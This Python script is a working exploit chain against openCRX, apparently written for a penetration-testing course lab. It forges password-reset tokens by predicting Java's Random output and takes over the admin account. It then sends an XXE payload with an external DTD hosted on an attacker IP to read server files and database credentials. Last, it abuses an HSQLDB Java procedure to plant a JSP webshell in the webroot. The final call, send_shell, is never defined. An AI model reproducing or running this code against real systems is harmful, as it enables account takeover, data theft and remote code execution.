import sys, re, os
import requests
import subprocess
import base64
import json
import time
requests.packages.urllib3.disable_warnings()
from secrets import token_hex
import jaydebeapi

def b64encode(s):
	return base64.b64encode(s.encode()).decode()

def current_milli_time():
	return int(time.time() * 1000)

def requestResetPassword(ip, username):
	target = f"http://{ip}:8080/opencrx-core-CRX/RequestPasswordReset.jsp"
	data = {
		'id': username
	}

	r = requests.post(target, data=data)
	# print(r.text)
	if "Password reset request successful" not in r.text:
		print("Password reset unsuccessful")
		exit(0)

	print(f"Password reset successfully for user {username}")

# Uses java to generate list of tokens (but this isn't really stand-alone POC)
def gen_tokens(low, high):
	cmd = f"java OpenCRXToken {low} {high}"
	proc = subprocess.run(cmd, shell=True, capture_output=True)
	output = proc.stdout.decode()
	tokens = output.split('\n')

	tokens = [token for token in tokens if len(token) == 40]
	return tokens

class JavaRandom():
	"""docstring for JavaRandom"""
	def __init__(self, seed):
		self.seed = (seed ^ 25214903917) & ((1<<48) -1)
		
	def next(self, bits):
		# print((self.seed * 25214903917 + 11))
		self.seed = (self.seed * 25214903917 + 11) & ((1<<48) -1)
		# print(self.seed)
		return int(self.seed >> (48 - bits))

	# Returns value from [0,n)
	def nextInt(self, n):
		if (n<=0):
			exit(0)
		
		bits = 0
		val = 0
		while True:
			bits = self.next(31)
			val = bits % n
			if (bits - val + (n-1) >= 0): 
				return val

	def generate_token(self, length):
		alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
		s = ""
		for i in range(length):
			x = self.nextInt(62)
			s += alphabet[x]
		return s

def generate_tokens(low, high):
	length = 40
	tokens = []
	for i in range(low, high):
		rand = JavaRandom(i)
		tokens.append(rand.generate_token(length))
	return tokens

def resetPassword(ip, username, password, tokens):
	s = requests.Session()

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	target = f"http://{ip}:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

	for token in tokens:
		data = {
			't': token,
			'p': 'CRX',
			's': 'Standard',
			'id': username,
			'password1': password,
			'password2': password 
		}

		r = s.post(target, data=data)

		if "Unable to reset password" in r.text:
			pass
		else:
			print(f"Successfully reset password to {password} with token {token}")
			return
	
	print("Password not reset successfully")
	exit(0)

def login(ip, username, password):
	s = requests.Session()

	proxies = {
		'http': 'http://127.0.0.1:8080',
		'https': 'http://127.0.0.1:8080'
	}
	s.proxies.update(proxies)

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	target = f"http://{ip}:8080/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false"
	r = s.get(target)

	target = f"http://{ip}:8080/opencrx-core-CRX/j_security_check"
	data = {
		"j_username": username,
		"j_password": password
	}

	r = s.post(target, data=data, allow_redirects=True)
	fail_element = "Login failed - Please try again"
	if fail_element in r.text:
		print("Login failure")
		exit(0)

	print(f"Succesfull logged in as user {username}")
	print("Clearing notifications")

	url = re.findall(r"window.location.href=\'(.*?)\';", r.text)[0]
	requestId = re.findall(r"\?requestId=(.*?)&", url)[0]
	target = f"http://{ip}:8080/opencrx-core-CRX/ObjectInspectorServlet"
	target += f"?requestId={requestId}"
	target += "&event=15"
	target += "&parameter=pane*(0)*reference*(0)*referenceName*(alert)"

	r = s.get(target)
	resp = r.text
	# with open("resp.html", "w") as f:
	# 	f.write(r.text)

	notifications = re.findall(r"xri://@openmdx\*org\.opencrx\.kernel\.home1/provider/CRX/segment/Standard/userHome/admin-Standard/alert/(.*?)\)", resp)
	notifications = list(set(notifications))
	print("Found notification IDs: ", notifications)

	parameterList = ""
	for notification in notifications:
		parameterList += f"xri*(xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/admin-Standard/alert/{notification})"
		parameterList += ' \n'

	data = {
		"requestId.submit": (None, requestId),
		"reference": (None, 0),
		"pane": (None, 0),
		"size": (None, ""),
		"event.submit": (None, 28),
		"parameter.list": (None, parameterList)
	}

	target = f"http://{ip}:8080/opencrx-core-CRX/ObjectInspectorServlet"
	r = s.post(target, files=data)
	print("Cleared notifications")

	return s

# 9.3.6.3: Create script to parse results of XXE and clearly display fiel contents
def read_file(ip, session, username, password, filename, LHOST):
	print()
	print(f"Reading file contents of file {filename}")
	print("Remember to make sure web-server is running")

	with open("wrapper.dtd", "w") as f:
		contents = ("<!ENTITY % start \"<![CDATA[\">\n"
		f"<!ENTITY % file SYSTEM \"file://{filename}\" >\n"
		"<!ENTITY % end \"]]>\">\n"
		"<!ENTITY wrapper \"%start;%file;%end;\"\n>")
		f.write(contents)

	brkpoint = "hhhhhbreakpoint" # Unique word to sandwich output
	xml = ("<?xml version=\"1.0\"?>\n"
	"<!DOCTYPE data[\n"
	"<!ENTITY % dtd SYSTEM \"http://192.168.45.221/wrapper.dtd\" >\n"
	"%dtd;\n"
	"]>\n"
	"<org.opencrx.kernel.account1.Contact>\n"
	f"<lastName>{brkpoint}&wrapper;{brkpoint}</lastName>\n"
	"<firstName>Tom</firstName>\n"
	"</org.opencrx.kernel.account1.Contact>")

	auth_header = f"Basic {b64encode(username + ':' + password)}"
	headers = {
		'Content-Type': 'application/xml',
		'Authorization': auth_header
	}

	target = f"http://{ip}:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account"
	r = session.post(target, data=xml, headers=headers)
	file_contents = r.text.split(brkpoint)[1]
	
	return file_contents

def login_db(ip, db_username, db_password):
	print(f"Logging into database with credentials {db_username}:{db_password}")
	jar = "./hsqldb.jar"
	url = f"jdbc:hsqldb:hsql://{ip}:9001/CRX"

	conn = jaydebeapi.connect(
		"org.hsqldb.util.DatabaseManagerSwing",
		url, 
		[db_username, db_password],
		jar
	)
	curs = conn.cursor()

	return curs

def send_file(curs, filename):
	procedure_name = f"writeBytesToFilename{token_hex(4)}"
	print("Creating file write procedure: ", procedure_name)

	cmd = (
		f"CREATE PROCEDURE {procedure_name}(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))\n"
		"LANGUAGE JAVA\n"
		"DETERMINISTIC NO SQL\n"
		"EXTERNAL NAME\n"
		"'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
	)

	curs.execute(cmd)

	filepath = "/home/student/crx/apache-tomee-plus-7.0.5/webapps/ROOT/shell.jsp"

	with open("cmd.jsp", "r") as f:
		import codecs
		shell = f.read()
		hex_shell = shell.encode('utf-8').hex()

	cmd = f"call {procedure_name}(\'{filepath}\', cast('{hex_shell}' AS VARBINARY(1024)))"
	curs.execute(cmd)
	print("JSP webshell written onto target system")


def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
	username = "admin-Standard"
	password = "PwnedPassword!"
	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = 9001

	# low = current_milli_time()
	# requestResetPassword(ip, username)
	# high = current_milli_time()
	# print(f"Timestamp seed range: {{{low} - {high}}}, with {high-low+1} tokens")

	# tokens = generate_tokens(low, high)
	# tokens2 = gen_tokens(low, high)
	# assert tokens == tokens2, "Issue generating tokens"
	# print(f"Generated {high-low+1} tokens")

	# print("Spraying tokens at target")
	# resetPassword(ip, username, password, tokens)

	print("Logging in")
	session = login(ip, username, password)
	
	filename = "/home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml"
	filename = "/home/student/crx/data/hsqldb/dbmanager.sh"
	print("Getting database credentials from dbmanager.sh file with XXE")
	db_manager_contents = read_file(ip, session, username, password, filename, LHOST)
	db_username = re.findall(r'--user (.*?) --password', db_manager_contents)[0]
	db_password = re.findall(r'--password (\S*)', db_manager_contents)[0] # Match non-whitespacee

	curs = login_db(ip, db_username, db_password)

	send_file(curs, "cmd.jsp")

	send_shell(ip, LHOST, LPORT)

if __name__ == '__main__':
	main()